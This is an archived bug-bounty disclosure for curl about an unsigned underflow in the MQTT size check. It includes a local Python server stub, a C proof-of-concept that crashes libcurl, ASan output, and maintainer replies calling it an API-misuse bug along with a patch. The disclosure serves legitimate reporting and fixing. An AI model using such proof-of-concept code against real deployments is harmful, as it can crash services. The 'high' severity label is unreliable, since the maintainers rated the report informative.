---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/integer-overflow
  - env/network
  - vuln/dos
  - vuln/misconfiguration
substate: "informative"
weakness: "Integer Overflow"
enriched: true
body: true
date: 2026-01-13
submitted: 2026-01-13T07:12:57.184Z
bounty_usd: null
votes: 5
cve: []
program: "[[programs/curl|curl]]"
reporter: "gudyuu"
source: "https://hackerone.com/reports/3508500"
title: "integer Overflow in MQTT Protocol Handling Allows Bypassing Message Size Limit"
---
# integer Overflow in MQTT Protocol Handling Allows Bypassing Message Size Limit

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 5 | **Program:** curl | **Disclosed:** 2026-01-13

- Report: [https://hackerone.com/reports/3508500](https://hackerone.com/reports/3508500)
- CWE: Integer Overflow
- Submitted: 2026-01-13T07:12:57.184Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
A logic error involving an integer overflow (specifically, an unsigned integer underflow) exists in the lib/mqtt.c file within the mqtt_publish function. This vulnerability allows an attacker (or a malicious user configuration) to bypass the explicit MAX_MQTT_MESSAGE_SIZE check.

The vulnerability occurs when curl calculates whether an MQTT packet exceeds the maximum allowed size ( 0xFFFFFFF or ~268 MB). The validation logic performs a subtraction operation using the payload length before verifying if the payload is already too large. If the payload length exceeds the maximum size, the subtraction wraps around (underflows) to a large positive value, causing the safety check to pass incorrectly.

This leads to curl attempting to allocate a massive amount of memory and sending a packet that violates the intended protocol constraints defined in the source code.


## Vulnerable code
https://github.com/curl/curl/blob/master/lib/mqtt.c#L533
https://github.com/curl/curl/blob/master/lib/mqtt.c#L563-L568

## Affected version
current (8.18.0)

## Steps To Reproduce:
To reproduce this issue, we need  MQTT server to accept the connection and a C program using libcurl to send a payload larger than MAX_MQTT_MESSAGE_SIZE .

1.MQTT Server ( mqtt_server.py )
```
import socket
import struct
import sys
import time

def run_server():
    host = '127.0.0.1'
    port = 1883
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    sock.listen(1)
    
    print(f"Listening on {host}:{port}")
    sys.stdout.flush()
    
    conn, addr = sock.accept()
    print(f"Connection from {addr}")
    sys.stdout.flush()
    
    try:
        # Read CONNECT packet
        # Just read some bytes
        data = conn.recv(1024)
        print(f"Received CONNECT: {len(data)} bytes")
        sys.stdout.flush()
        
        # Send CONNACK
        # Fixed header: 0x20, Remaining Length: 0x02
        # Variable header: Connect Acknowledge Flags: 0x00, Connect Return Code: 0x00 (Accepted)
        connack = b'\x20\x02\x00\x00'
        conn.sendall(connack)
        print("Sent CONNACK")
        sys.stdout.flush()
        
        # Now expect PUBLISH
        # Read the first few bytes to see the length
        head = conn.recv(5)
        if not head:
            print("Client disconnected immediately")
            return

        print(f"Received head: {head.hex()}")
        sys.stdout.flush()
        
        # We expect a huge packet if the vulnerability works
        
        received = len(head)
        start_time = time.time()
        
        while True:
            chunk = conn.recv(65536)
            if not chunk:
                break
            received += len(chunk)
            if time.time() - start_time > 1:
                print(f"Received {received} bytes...", end='\r')
                sys.stdout.flush()
                start_time = time.time()
                
        print(f"\nTotal received: {received} bytes")
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        conn.close()
        sock.close()

if __name__ == '__main__':
    run_server()
```
2.  Exploit Code
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

int main(void)
{
    CURL *curl;
    CURLcode res;

    
    setenv("ASAN_OPTIONS", "detect_leaks=0", 1);

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "mqtt://127.0.0.1:1883/topic");
        curl_easy_setopt(curl, CURLOPT_POST, 1L);

        /* use payload bigger than MAX_MQTT_MESSAGE_SIZE (~268MB) */
        const curl_off_t huge_size = (curl_off_t)300 * 1024 * 1024;
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE_LARGE, huge_size);

  
        char *buf = (char *)calloc(1, 1024);
        if(!buf) {
            fprintf(stderr, "Failed to allocate small buffer\n");
            return 1;
        }
        memset(buf, 'A', 1024);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buf);

        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

        printf("ASAN PoC: attempting to send %lld bytes to MQTT...\n",
               (long long)huge_size);
        res = curl_easy_perform(curl);

        if(res == CURLE_OK) {
            printf("[ASAN] Transfer succeeded -> limit bypass confirmed.\n");
        }
        else if (res == CURLE_TOO_LARGE || res == CURLE_FILESIZE_EXCEEDED) {
            printf("[ASAN] Transfer blocked by size limit.\n");
        }
        else {
            printf("[ASAN] Transfer failed: %d (%s)\n", res, curl_easy_strerror(res));
        }

        free(buf);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
    return 0;
}
```

## Ouput
1. MQTT Server ( mqtt_server.py )
```
Listening on 127.0.0.1:1883
Connection from ('127.0.0.1', 51950)
Received CONNECT: 26 bytes
Sent CONNACK
Client disconnected immediately
```
2. POC ouput
```
ASAN PoC: attempting to send 314572800 bytes to MQTT...
*   Trying 127.0.0.1:1883...
* Connected to 127.0.0.1 (127.0.0.1) port 1883
* Using client id 'curlzeT6w484'
> MQTT<
       curlzeT6w484* mqtt_doing: state [0]
* mqtt_doing: state [0]
<  < * mqtt_doing: state [2]
< =================================================================
==10341==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x619000002780 at pc 0x000105765c88 bp 0x00016aff1710 sp 0x00016aff0eb0
READ of size 314572800 at 0x619000002780 thread T0
    #0 0x000105765c84 in memcpy+0x284 (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x85c84)
    #1 0x00019afb4d58 in mqtt_publish+0x130 (libcurl.4.dylib:arm64e+0x38d58)
    #2 0x00019afb4674 in mqtt_doing+0x154 (libcurl.4.dylib:arm64e+0x38674)
    #3 0x00019afb71c4 in multi_runsingle+0x258 (libcurl.4.dylib:arm64e+0x3b1c4)
    #4 0x00019afb6ebc in curl_multi_perform+0xc8 (libcurl.4.dylib:arm64e+0x3aebc)
    #5 0x00019af911b8 in curl_easy_perform+0x10c (libcurl.4.dylib:arm64e+0x151b8)
    #6 0x000104e0c990 in main poc_asan.c:42
    #7 0x000181126b94  (<unknown module>)

0x619000002780 is located 0 bytes after 1024-byte region [0x619000002380,0x619000002780)
allocated by thread T0 here:
    #0 0x00010571d620 in calloc+0x80 (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x3d620)
    #1 0x000104e0c8d4 in main poc_asan.c:30
    #2 0x000181126b94  (<unknown module>)

SUMMARY: AddressSanitizer: heap-buffer-overflow (libcurl.4.dylib:arm64e+0x38d58) in mqtt_publish+0x130
Shadow bytes around the buggy address:
  0x619000002500: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x619000002580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x619000002600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x619000002680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x619000002700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x619000002780:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x619000002800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x619000002880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x619000002900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x619000002980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x619000002a00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==10341==ABORTING

## Impact

1. Applications using libcurl MQTT can crash or abort if they set CURLOPT_POSTFIELDSIZE_LARGE to a very large value but provide a small CURLOPT_POSTFIELDS buffer, ASAN confirms an out-of-bounds read.
2. Failing to enforce size limits via a correct comparison allows attackers or misconfigurations to force libcurl to process oversized payloads. The flawed check is a classic unsigned wraparound (CWE-190).

## Timeline

- **Report Filed**
- **2026-01-13** @bagder: > This leads to curl attempting to allocate a massive amount of memory and sending a packet that violates the intended protocol constraints defined in the source code.

That seems correct. A bug, but not  a security problem...
- **2026-01-13** @bagder: Proposed patch:
~~~diff
From 929c808330ab52a15b00c6c69d8e11638b736a38 Mon Sep 17 00:00:00 2001
From: Daniel Stenberg <daniel@haxx.se>
Date: Tue, 13 Jan 2026 08:20:12 +0100
Subject: [PATCH] mqtt: better too-big-message-check

Reported-by: gudyuu on hackerone
---
 lib/mqtt.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/lib/mqtt.c b/lib/mqtt.c
index 5f5c91a49a..fc3389e7f5 100644
--- a/lib/mqtt.c
+++ b/lib/mqtt.c
@@ -560,11 +560,11 @@ static CURLcode mqtt_publish(struct Curl_easy *data)
   if(result)
     goto fail;
 
   remaininglength = payloadlen + 2 + topiclen;
   encodelen = mqtt_encode_len(encodedbytes, remaininglength);
-  if(MAX_MQTT_MESSAGE_SIZE - remaininglength - 1 < encodelen) {
+  if(remaininglength > (MAX_MQTT_MESSAGE_SIZE - encodelen - 1)) {
     result = CURLE_TOO_LARGE;
     goto fail;
   }
 
   /* add the control byte and the encoded remaining length */
-- 
2.51.0
- **2026-01-13** @bagder: BTW, your libcurl code above is abusing the API which is why it crashes.
- **2026-01-13** @bagder: PR: https://github.com/curl/curl/pull/20281
- **2026-01-13** @dgustafsson: Agreed, not a security problem, and the patch looks right from reading (though it hurts my eyes to see `len` and `length` on the same line =))
- **2026-01-13** @bagder: > though it hurts my eyes to see len and length on the same line

If it made you blink twice maybe you see the code clearer now? :grin:
- **2026-01-13** @dgustafsson: At least the macro isn't `MAX_MQTT_MESSAGE_LN` =), +1 on proceeding with the patch, will chime that in on Github as well.
- **2026-01-13** @jimfuller2024: FWIW I also see this as a bug and not a vuln
- **Report Informative**
- **Agreed On Going Public**
- **2026-01-13** @gudyuu: Hello @bagder , can the disclosure be postponed for now? And if I successfully escalate it to leads to information disclosure, can it be categorized as a vulnerability?
- **2026-01-13** @bagder: Sure I can wait, but if you look at the malloc following the check you see that it allocates the full size. It will just cause protocol issues.
- **2026-01-13** @gudyuu: Thanks for the clarification @bagder.  I Agreed this is a bug, not a security vulnerability. Disclosure is fine.
- **Manually Disclosed**
